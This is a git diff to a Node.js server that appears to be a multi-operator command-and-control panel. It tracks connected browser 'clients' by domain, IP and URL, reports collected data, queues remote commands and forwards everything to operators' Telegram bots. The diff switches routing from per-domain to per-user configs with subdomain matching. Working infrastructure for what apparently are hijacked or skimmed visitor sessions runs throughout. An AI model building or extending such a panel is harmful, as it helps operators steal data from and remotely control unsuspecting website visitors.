@@ -25,9 +25,9 @@ if (!fs.existsSync(SESSIONS_DIR)) {
 // Telegram bot (default)
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
-// ─── Per-domain Telegram bot support ─────────────────────────────────────
-// Maps domain name → { token, chatId }
-const domainTelegramConfigs = new Map();
+// ─── Per-user Telegram bot support with domain filtering ─────────────────
+// Maps userId (string key) → { userId, domain, token, chatId }
+const userTelegramConfigs = new Map();
 // Maps token → TelegramBot instance (avoids duplicate polling bots)
 const botInstances = new Map();
 // Register the default bot
@@ -42,12 +42,48 @@ function getOrCreateBot(token) {
     return newBot;
 }
 
-function getTelegramForDomain(domain) {
-    if (domain && domainTelegramConfigs.has(domain)) {
-        const config = domainTelegramConfigs.get(domain);
-        return { bot: getOrCreateBot(config.token), chatId: config.chatId };
+function normalizeDomain(value) {
+    return String(value || '').trim().toLowerCase().replace(/\.+$/, '');
+}
+
+function isSameDomainOrSubdomain(domainName, mainDomain) {
+    const domain = normalizeDomain(domainName);
+    const main = normalizeDomain(mainDomain);
+    if (!domain || !main) return false;
+    if (domain === main) return true;
+    return domain.endsWith(`.${main}`);
+}
+
+function getTelegramTargetsForDomain(domain) {
+    const uniqueTargets = new Map();
+    for (const config of userTelegramConfigs.values()) {
+        if (!config?.token || !config?.chatId || !config?.domain) continue;
+        if (!isSameDomainOrSubdomain(domain, config.domain)) continue;
+        const key = `${config.token}|${config.chatId}`;
+        if (!uniqueTargets.has(key)) {
+            uniqueTargets.set(key, {
+                bot: getOrCreateBot(config.token),
+                chatId: config.chatId
+            });
+        }
     }
-    return { bot, chatId: TELEGRAM_CHAT_ID };
+
+    if (uniqueTargets.size === 0) {
+        return [{ bot, chatId: TELEGRAM_CHAT_ID }];
+    }
+
+    return Array.from(uniqueTargets.values());
+}
+
+async function sendTelegramToDomain(domain, message, options = {}) {
+    const targets = getTelegramTargetsForDomain(domain);
+    for (const target of targets) {
+        try {
+            await target.bot.sendMessage(target.chatId, message, options);
+        } catch (e) {
+            console.error('[TG] sendMessage error:', e.message);
+        }
+    }
 }
 
 function loadTelegramConfigs() {
@@ -55,11 +91,17 @@ function loadTelegramConfigs() {
         try {
             const raw = fs.readFileSync(TELEGRAM_CONFIGS_FILE, 'utf8');
             const configs = JSON.parse(raw);
-            for (const [domain, config] of Object.entries(configs)) {
-                domainTelegramConfigs.set(domain, config);
+            for (const [key, config] of Object.entries(configs)) {
+                if (!config || !config.token || !config.chatId) continue;
+                const hasExplicitDomain = Boolean(config.domain);
+                const userId = config.userId ? String(config.userId) : (key.startsWith('legacy:') ? null : key);
+                const domain = hasExplicitDomain ? config.domain : key.replace(/^legacy:/, '');
+                if (!domain) continue;
+
+                userTelegramConfigs.set(String(key), { userId, domain, token: config.token, chatId: config.chatId });
                 getOrCreateBot(config.token);
             }
-            console.log(`📡 Loaded ${domainTelegramConfigs.size} domain Telegram config(s)`);
+            console.log(`📡 Loaded ${userTelegramConfigs.size} user Telegram config(s)`);
         } catch (e) {
             console.error('[TG] Failed to load telegram configs:', e.message);
         }
@@ -69,8 +111,8 @@ function loadTelegramConfigs() {
 function saveTelegramConfigs() {
     try {
         const obj = {};
-        for (const [domain, config] of domainTelegramConfigs) {
-            obj[domain] = config;
+        for (const [key, config] of userTelegramConfigs) {
+            obj[key] = config;
         }
         fs.writeFileSync(TELEGRAM_CONFIGS_FILE, JSON.stringify(obj, null, 2));
     } catch (e) {
@@ -393,12 +435,7 @@ async function sendDomainSessions(domain) {
         }
     }
     
-    const { bot: tgBot, chatId: tgChatId } = getTelegramForDomain(domain);
-    try {
-        await tgBot.sendMessage(tgChatId, message, { parse_mode: 'Markdown' });
-    } catch (e) {
-        console.error('[TG] sendDomainSessions error:', e.message);
-    }
+    await sendTelegramToDomain(domain, message, { parse_mode: 'Markdown' });
 }
 
 async function sendSessionInfo(socketId) {
@@ -421,15 +458,10 @@ async function sendSessionInfo(socketId) {
     }
     if (!hasData) message += `└─ No data collected yet\n`;
     
-    const { bot: tgBot, chatId: tgChatId } = getTelegramForDomain(domain);
-    try {
-        await tgBot.sendMessage(tgChatId, message, {
-            parse_mode: 'Markdown',
-            reply_markup: buildKeyboard(socketId, domain)
-        });
-    } catch (e) {
-        console.error('[TG] sendSessionInfo error:', e.message);
-    }
+    await sendTelegramToDomain(domain, message, {
+        parse_mode: 'Markdown',
+        reply_markup: buildKeyboard(socketId, domain)
+    });
 }
 
 async function notifyConnect(socketId, domain, clientIp, currentUrl, isReconnect = false) {
@@ -453,15 +485,10 @@ async function notifyConnect(socketId, domain, clientIp, currentUrl, isReconnect
     
     const message = `${isReconnect ? '🟢' : '🆕'} *CLIENT ${isReconnect ? 'BACK ONLINE' : 'CONNECTED'}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n🌐 Domain: \`${domain}\`\n📡 IP: \`${clientIp}\`\n🔗 URL: ${currentUrl}\n📅 Time: \`${new Date().toISOString()}\`${reconnectInfo}\n${isReconnect ? '\n📦 *Pending commands will be delivered now*' : ''}`;
     
-    const { bot: tgBot, chatId: tgChatId } = getTelegramForDomain(domain);
-    try {
-        await tgBot.sendMessage(tgChatId, message, {
-            parse_mode: 'Markdown',
-            reply_markup: buildKeyboard(socketId, domain)
-        });
-    } catch (e) {
-        console.error('[TG] notifyConnect error:', e.message);
-    }
+    await sendTelegramToDomain(domain, message, {
+        parse_mode: 'Markdown',
+        reply_markup: buildKeyboard(socketId, domain)
+    });
 }
 
 async function notifyDisconnect(socketId, domain, clientIp) {
@@ -478,23 +505,13 @@ async function notifyDisconnect(socketId, domain, clientIp) {
     updateSessionData(socketId, 'last_offline', new Date().toISOString());
     
     const message = `🔴 *CLIENT DISCONNECTED* (No activity for ${DISCONNECT_GRACE_PERIOD/60000} minutes)\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n🌐 Domain: \`${domain}\`\n📡 IP: \`${clientIp}\`\n📅 Time: \`${new Date().toISOString()}\`\n📊 Total offline events: ${offlineCount}\n\n_Client can come back online within ${DISCONNECT_GRACE_PERIOD/60000} minutes without notification_`;
-    const { bot: tgBot, chatId: tgChatId } = getTelegramForDomain(domain);
-    try {
-        await tgBot.sendMessage(tgChatId, message, { parse_mode: 'Markdown' });
-    } catch (e) {
-        console.error('[TG] notifyDisconnect error:', e.message);
-    }
+    await sendTelegramToDomain(domain, message, { parse_mode: 'Markdown' });
 }
 
 async function notifyCommandSent(socketId, command, delivered, domain = null) {
     const status = delivered ? '✅ DELIVERED' : '❌ FAILED';
     const message = `📨 *COMMAND ${status}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n💬 Command: \`${command}\`\n📅 Time: \`${new Date().toISOString()}\``;
-    const { bot: tgBot, chatId: tgChatId } = getTelegramForDomain(domain);
-    try {
-        await tgBot.sendMessage(tgChatId, message, { parse_mode: 'Markdown' });
-    } catch (e) {
-        console.error('[TG] notifyCommandSent error:', e.message);
-    }
+    await sendTelegramToDomain(domain, message, { parse_mode: 'Markdown' });
 }
 
 // ─── Shared callback handler (registered on every bot instance) ───────────
@@ -521,13 +538,12 @@ function registerBotCallbacks(botInstance) {
         const delivered = sendToClient(socketId, message);
         await notifyCommandSent(socketId, message, delivered, sessionDomain);
         if (!delivered) {
-            const { bot: tgBot, chatId: tgChatId } = getTelegramForDomain(sessionDomain);
-            await tgBot.sendMessage(tgChatId, `📦 Command \`${message}\` queued for \`${socketId}\``, { parse_mode: 'Markdown' });
+            await sendTelegramToDomain(sessionDomain, `📦 Command \`${message}\` queued for \`${socketId}\``, { parse_mode: 'Markdown' });
         }
     });
 }
 
-// Register callbacks on the default bot and load persisted domain configs
+// Register callbacks on the default bot and load persisted user configs
 registerBotCallbacks(bot);
 loadTelegramConfigs();
 
@@ -543,7 +559,7 @@ const server = http.createServer((req, res) => {
         return;
     }
     
-    // Set per-domain Telegram config
+    // Set per-user Telegram config with domain filter
     if (pathname === '/setDomainTelegram' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => { body += chunk.toString(); });
@@ -551,18 +567,27 @@ const server = http.createServer((req, res) => {
             res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
             try {
                 const payload = JSON.parse(body);
-                const domain   = (payload.domain   || '').trim();
-                const token    = (payload.token    || '').trim();
-                const chatId   = (payload.chatId   || '').trim();
+                const domain   = normalizeDomain(payload.domain);
+                const token    = (payload.token || '').trim();
+                const chatId   = String(payload.chatId || '').trim();
+                const userId   = payload.userId !== undefined && payload.userId !== null
+                    ? String(payload.userId).trim()
+                    : '';
                 if (!domain || !token || !chatId) {
                     res.end(JSON.stringify({ success: false, error: 'domain, token and chatId are required' }));
                     return;
                 }
-                domainTelegramConfigs.set(domain, { token, chatId });
+                const configKey = userId || `legacy:${domain}`;
+                userTelegramConfigs.set(configKey, {
+                    userId: userId || null,
+                    domain,
+                    token,
+                    chatId
+                });
                 getOrCreateBot(token);
                 saveTelegramConfigs();
-                console.log(`📡 Domain Telegram config saved for: ${domain}`);
-                res.end(JSON.stringify({ success: true, message: `Telegram config saved for ${domain}` }));
+                console.log(`📡 Telegram config saved for ${userId ? `user ${userId}` : 'legacy config'} (${domain})`);
+                res.end(JSON.stringify({ success: true, message: `Telegram config saved for ${userId ? `user ${userId}` : domain}` }));
             } catch (e) {
                 res.end(JSON.stringify({ success: false, error: e.message }));
             }
